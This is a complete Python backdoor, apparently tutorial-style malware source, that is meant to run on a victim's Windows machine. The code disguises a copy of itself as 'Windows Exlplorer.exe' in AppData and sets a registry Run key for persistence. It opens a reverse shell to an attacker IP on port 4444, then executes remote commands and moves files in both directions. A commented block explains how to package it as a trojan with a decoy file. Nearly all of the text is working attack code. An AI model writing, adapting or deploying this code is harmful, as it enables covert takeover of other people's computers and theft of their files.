#!/usr/bin/env python3
#file should exists on victim machine
import socket
import subprocess
import json
import os
import base64  # Import base64 for encoding file content
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persitent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # ensure the backdoor is persistent with reverse shell
    def become_persitent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Exlplorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)   
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    # handles persistence
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    # handles persistence
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    # start the reverse shell
    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return e.output

    # handles shell input and output
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")  # Encode file content to base64

    # handles shell input and output
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Decode base64 content before writing
            return "[+] Upload successful"


    def change_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except FileNotFoundError:
            return "[!] Directory not found: " + path

    # handles commands
    def run(self):
        while True:
            command = self.reliable_receive()  # Receive command
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(" ".join(command))
                    command_result = command_result.decode("utf-8", errors="ignore")
            except Exception:
                command_result = "[-] Error during execution"

            self.reliable_send(command_result)

# Specify the file name to be executed if you are converting the script to an trojan
"""
file_name = sys._MEIPASS + "your file name"  # Specify the file name to be executed
subprocess.Popen(file_name, shell=True)
"""
# initialize the backdoor
try:
	my_backdoor = Backdoor("your ip", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()